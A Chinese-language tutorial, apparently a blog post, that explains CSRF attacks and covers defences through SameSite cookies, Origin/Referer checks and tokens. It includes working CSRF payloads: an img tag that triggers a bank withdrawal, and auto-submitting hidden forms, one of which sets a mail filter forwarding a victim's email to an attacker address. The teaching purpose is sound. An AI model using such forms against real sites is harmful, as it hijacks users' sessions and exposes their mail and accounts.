## 一、什么是CSRF攻击

我们常常听到这样一句话：默认的链接不要点，那些年也听过，邮箱中的垃圾链接不要点。
因为可能是黑客发起的CSRF攻击，所以在点击之前最好是确认链接的安全性。

CSRF（Cross-site requests forgery）中文名：跨站脚本伪造

简单的理解就是，黑客盗用了你的身份，以你的名义向你访问的站点发送请求。这些请求操作可能是转发邮件、获取发送内容，发起转账、获取权限等。

CSRF攻击发起于第三方网站，比较隐蔽，可以直接对用户的利益造成损失。一旦攻击成功，危害是很严重的。

## 二、CSRF攻击的原理

### 1、攻击的流程

用户登录某个站点后，黑客引诱用户访问第三方的恶意站点，恶意站点利用用户的登录凭证，向用户站点发送伪造的请求，从而执行某种损害用户利益的操作。

具体的流程是：
- 1、用户访问a.com（正常站点），并保持登录状态
- 2、黑客引诱用户登录hack.com(第三方恶意站点)，hack.com携带登录凭证向a.com发送请求
- 3、a.com验证非法请求的登录凭证，误以为是用户执行了某种操作。
- 4、攻击成功，a.com执行操作（转账、开通权限、邮件过滤等）

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/163825750971692f0be3288a64a4caf9d7686afdebda5_tplv-k3u1fbpfcp-watermark.png)

所以CSRF攻击要满足两个条件：
- 攻击站点保持登录状态
- 后端允许跨域且没有验证请求来源

### 2、攻击的特点

- 1、CSRF攻击无法获取站点的Cookie，只能盗用
- 2、CSRF攻击一般是第三方站点发起，即肯定是跨域攻击

### 3、CSRF攻击的类型

- GET请求攻击

​		构造非法的Get攻击请求

```js
<img src="http://bank.cm/withdraw?amount=500000&for=zhangsan" >
```

- POST请求攻击

  后端配置CORS接口跨域请求，如果要携带Cookie，那么必须要配置具体的请求域名`Access-Control-Allow-Origin, *test.cn`

  如果配置成`Access-Control-Allow-Origin, *`是无法发送Cookie的，但对于Form提交来说确实可以携带Cookie的。所以CSRF POST攻击主要通过Form表单实现。下面有实战的例子。

- 嵌入的攻击链接

  主要对于内容型网站、论坛、博客等，可以允许用户评论等输入内容，如果黑客输入攻击链接，保存后，如果其他用户点击，就有可能发起攻击。

## 三、CSRF攻击的案例

一个实际攻击的案例：

用户A登录邮箱后，看到一个领奖的邮件，就点击进去查看，发现什么都没有

过了一段时间后，发现自己的邮箱账号无法登录了

A怀疑自己受到CSRF攻击，就重置账号后找到之前的异常邮件，查看源码

发现是一段form表单提交的代码，请求设置了邮件过滤器，将邮件都转发到hack@163.com上，导致信息泄露

```
<form action="http://a.com/filter" method="POST">\
    <p>user: <input type="hidden" name="filter" value="on" /></p>\
    <p>email: <input type="hidden" name="email" value="hack@163.com" /></p>\
    <p>email: <input type="hidden" name="action" value="filterEail" /></p>\
</form>
<script> document.forms[0].submit(); </script>
```

实际这个案例背后发生了什么呢？

- 1、首先用户登录了邮箱账号，这时候服务器返回给Cookie保存在本地。
- 2、当用户点击了恶意链接，跳转了恶意站点，恶意站点带着Cookie直接执行转发邮件的请求
- 3、服务器收到请求以后，以为是用户自行发起的操作，就成功执行
- 4、黑客就可以收到用户邮件，也就可以通过验证邮件验证码，重置用户邮箱密码，从而窃取用户信息。

## 四、CSRF攻击的实践

### 1、前期准备：一个正常的可以登录的网站

**index.js** 

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1638257430108web-site-demo.png)

**web.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>用户正常访问网站</title>
    <style>
        #app {
            color: red
        }
    </style>
</head>
<body>
    <div>
        <p>当前为A站点：用户访问的正常网站，默认用户已登录站点，并缓存Cookies</p>
        <p>站点的Cookie是：<span id="app"></span></p>
        <a target="target" href="http://localhost:8080/index.html">CSRF攻击的恶意链接</p>
    </div>
    <script>
        document.cookie = "user:zhangsan"
        document.getElementById("app").innerHTML = document.cookie
    </script>
</body>
</html>
```

### 2、前期准备：一个攻击的请求或可以提交的页面

**发起CSRF攻击的站点**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>csrf攻击实践</title>
</head>
<body>
    <p>当前站点为B站点：是发起csrf攻击的站点</p>
    <div>
        <ul>
            <li>1、当打开该站点，该站点将请求A站点的api</li>
            <li>2、A站点接收到请求后，验证Cookie，认为是A站点的正常请求</li>
            <li>3、A站点执行Api操作，然后用户攻击成功</li>
        </ul>
    </div>
    <form method="POST" action="http://localhost:9000/api" enctype="multipart/form-data"> 
        <input type="hidden" name="lisi" value="true"/> 
        <input type="hidden" name="email" value="hacker@hack.com"/> 
    </form> 
    <script> 
        document.forms[0].submit();
    </script>
</body>
</html>
```
**启动端口为8080的node服务**

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1638257624713node.png)

### 3、模拟攻击

**1、用户正常访问的登录页面**

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1638257418490web-page.png)

**2、用户点击了未读邮件的恶意链接**

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/16382574003053.png)

**3、在正常站点后端Api，通过Cookie认为这是一个正常的用户操作，执行了某种操作**

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/16382574082174.png)

## 五、如何阻止CSRF攻击

根据CSRF攻击的特点：

（1）攻击请求来源于第三方服务器，阻止其他外域的请求。

（2）通过Cookie冒用用户信息，增加验证信息

所以针对CSRF攻击来源于第三方服务器，我们只能被动的减少服务器漏洞，防止攻击，下面总结了一些常见的处理方式

### 1、不点击陌生或者不被信任的网址

这一条就很厉害了，保证安全，不明邮件或者不明URL不要点击。如果非要点击，复制出来，换个不常用的浏览器，清空所有Cookie，再点击。

### 2、阻止第三方服务器向站点发送请求

#### 1）SameSite origin(注意兼容性)

Chrome 51 开始，浏览器的 Cookie 新增加了一个`SameSite`属性，用来防止 CSRF 攻击。

SameSite有以下三个值，表示的含义如下：

| 属性值 | 说明                                                         |
| ------ | ------------------------------------------------------------ |
| Strict | 最为严格，除非请求地址和服务器地址一致时才会发送Cookie，严格禁止了第三方Cookie |
| Lax    | 相对放宽限制，除了a、link、form的GET提交携带Cookie，其他的都禁止 |
| None   | 不限制Cookie发送，但还是遵守同源策略                         |

Strict 过于严格，比如登录过的站点，从百度搜索跳转过去，要重新登录，所以相对不友好。

设置了Strict和Lax模式，基本阻止了CSRF攻击的可能，但可能影响页面中的Form表单、iframe、ajax请求和图片请求。

Chrome80之前默认None，之后默认Lax，下面是不同模式实际在项目中发送Cookie情况

| 请求类型  |                 示例                 |    正常情况 | Lax         |
| :-------- | :----------------------------------: | ----------: | :---------- |
| 链接      |         `<a href="..."></a>`         | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  |  `<form method="GET" action="...">`  | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    |    `<iframe src="..."></iframe>`     | 发送 Cookie | 不发送      |
| AJAX      |            `$.get("...")`            | 发送 Cookie | 不发送      |
| Image     |          `<img src="...">`           | 发送 Cookie | 不发送      |

#### 2）同源检测，服务端校验请求来源

- 同源策略可以防止csrf攻击吗？
- 还需要验证请求头吗？
- 验证请求来源origin和referer

我们知道CSRF攻击都是发起于第三方站点，所以请求的来源必要和服务器不同，而且浏览器会自动给请求增加Origin和Referer字段，用来识别请求来源，那么只要我们在后端设置请求的来源，就可以防止CSRF攻击。

下面获取origin和referer，如果是第三方的请求，屏蔽即可。

对于Referer，如果添加了Meta标签，请求头中的Referer将不会携带。

```
<meta name="referrer" content="never">
```

Origin和Referer在个别浏览器表现不同，如果都无法获取，直接禁止访问即可。

![获取Origin和Referer](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/16394083526092.png)



### 3、增加Token校验

网站为了保持登录状态，开始一般都是登录后，服务器默认生成Cookies，客户端保存Cookies，每次请求默认都会携带Cookies，用户后端验证用户身份。

但Cookie会存在被攻击的风险，所以可以替换成Token，Token一般是后端服务由随机字符串+时间戳+其他生成然后通过加密算法生成。

用户登录后生成一个Token，后端保存起来，每次请求就可以验证Token的合法性和有效期，甚至可以封装user信息，这样黑客就不容易冒充用户发起攻击，即使知道了加密的结构也没法通过登录生成Token。

当然这样数据库就会保存大量的Token，对于服务器会造成一定的压力，也可以采取下面一种措施：同时保留Cookie和Token，Token仅用来防止CSRF攻击，不再保存数据库，直接在客户端保存，请求发送到服务器后，根据生成Token的算法计算Token的有效期和合法性，这样就避免了数据库读取的压力。

token的校验很常见，不仅可以用来做登录验证，也可以在使用Cookies做登录认证的同时使用token做CSRF的鉴权
